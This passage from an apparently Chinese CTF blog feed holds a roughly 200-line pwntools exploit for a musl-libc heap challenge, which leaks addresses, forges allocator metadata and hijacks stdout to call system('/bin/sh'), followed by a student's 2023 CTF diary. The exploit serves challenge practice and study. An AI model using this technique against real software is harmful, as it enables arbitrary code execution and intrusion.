title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./libc.so&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># 默认为\n对应的hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过dequeue的unlink在stdout-0x10 的地方写入fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将该fake meta进入active队列</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改meta的mem区域指向stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023小琐碎记录贴</title>
      <link href="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
      <url>/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h1><p>加入<code>Sloth</code>咯！！！<br>上学期<code>XSCTF</code>联合招新赛爆<code>0</code>后就没有在<code>CTF</code>走下去的打算，可是寒假在暨大的<code>i_corner</code>师傅的鼓励下打算再努力一把，刷了<code>2</code>个多月的<code>Crypto</code>和<code>misc</code>，最后在选拔赛拿了全场一血(我最爱的RSA)，太感动了<code>QAQ</code><br>不过也感受到了差距，第一名和第二名是大二的学长，分数比我高好多，同级的也有一位逆向好厉害<code>QAQ</code><br>搏一搏，单车变摩托，我要超越他们！！！！</p><h1 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h1><p>正式开始学<code>pwn</code>了捏  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="我的图图呢">  <h1 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h1><p>第一次打比赛，给打烂了捏&gt;_&lt;<br>打了一个月的<code>ret2libc</code>,才发现<code>pwn</code>原来还有这么多东西，看来要狠狠的卷了  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="我的图图呢">  <h1 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h1><p>好耶，闭关一段时间再参加比赛(蓝帽杯)，出了一道堆题，成就感拉满！！！！！！</p><h1 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h1><p>数模国赛逆大天，首先是有<code>78w</code>行数据，脚本跑一次好好几分钟，其次是题目完全没有思路，找不到适用的模型<code>&gt;_&lt;</code>，完全靠队友带飞<code>Orz</code></p><h1 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h1><p>香山杯太亏了，差一点点(几分)进决赛，问题出在<code>pwn</code>手(我),<code>pwn</code>差一题<code>Ak</code>，剩下一题<code>python pwn</code>，漏洞出现在<code>python</code>程序调用的函数包，函数包用<code>C++</code>写的，存在格式化字符串漏洞和栈溢出，可是我本地启动不了程序，调试不了<code>QAQ</code>，血亏，我背锅。赛后发现要使用<code>python3.7</code>才可以启动程序，裂大开<br>后期补充：决赛<code>awdp</code>的<code>3</code>题<code>pwn</code>我都会做，没去线下太可惜了，哦对，我还没进过线下(卑微)</p><h1 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h1><p>XSCTF联合招新赛结束拉，嘿嘿，第一次出题(一道简单的libc-2.27的unlink)，居然没人做？完了，要给<code>JANlittle</code>拉去喂鱼了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="我的图图呢">  <p>pwn的解题情况惨不忍睹，别后继无人啊QAQ(以后谁来带我)<br>133nson和Csome师兄出的<code>pwn</code>题质量是真的高，我要好好学习</p><h1 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h1><p>嘿嘿，<code>CS</code>杯选拔赛，欺负老实人<br>谁说算法只能用<code>C/C++</code>打的，上<code>python</code>！！！！！<br>4道题15分钟干了3题，而且2题一血，不过最后一题用深搜超时，到最后都没有做出来，哎，算法太烂了，而且好久没看了，人菜瘾大xD</p><h1 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h1><p>PolarCTF打爽了 Solved:24 grade:7000 rank:3<br>11题pwn全都会(有一题<code>house of orange</code>嫌麻烦且分不高没打，结果给<code>jelasin</code>师傅骂了<code>QAQ</code>)，还拿了题唯一血(预期解为改<code>printf</code>的格式表？不存在的，打<code>IO</code>才是<code>yyds</code>！！！)<br>Crypto全是脑洞题，没有数学题，差评QAQ，只会数学题&gt;_&lt;<br>有题逆向做出来后怎么交都是错，结束后才发现<code>flag</code>要进行<code>md5</code>加密，逆天(貌似题目上也没有说明XD)</p><h1 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h1><p>给<code>Csome</code>师兄拉去<code>S1uM4i</code>打<code>TCTF/0CTF</code>,坐大牢！！！题目过于逆天，连什么<code>ios kernel</code>都来了，感觉最少还要再练一年才能在这个比赛上做出题。<br>才大二，还来得及，冲！！！！</p><h1 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h1><p>强网杯太逆天了啊，学会了各种<code>io file</code>攻击以为可以乱杀，结果发现题目都是<code>VM</code>类型，完全看不懂逆向，看来<code>kernel</code>要延后一段时间再学了，先把<code>vmpwn</code>给拿下<br>比赛有点可惜，差一点进决赛<code>QAQ</code>，归根到底是我的问题，队友很<code>c</code>了，要是我能把那两题简单<code>pwn</code>做出来就能进决赛了(<code>WTOA</code>和<code>A-rtsp</code> 都是看不懂逆向，我的<code>500</code>分鸭<code>QAQ</code>)，寒假给我狠狠卷！！！！ 备战期末，这学期绩点必须给我高高高！！！！</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="我的图图呢">  <p>虽然很遗憾，不过也学到了怎么通过<code>puts</code>函数来调用<code>io</code>链，也算是一种所获吧，强网杯已经没有想进决赛的欲望了，太卷了<br>感觉<code>AFL fuzz</code>技术也要学学，在很多题目上都能用到</p><h1 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h1><p>好好好，上大学一年多，已经变成<code>IT</code>的形状了</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="我的图图呢">  <p>考完<code>java</code>放松的时候翻了一下上学期校队送的<code>《CTF权威指南 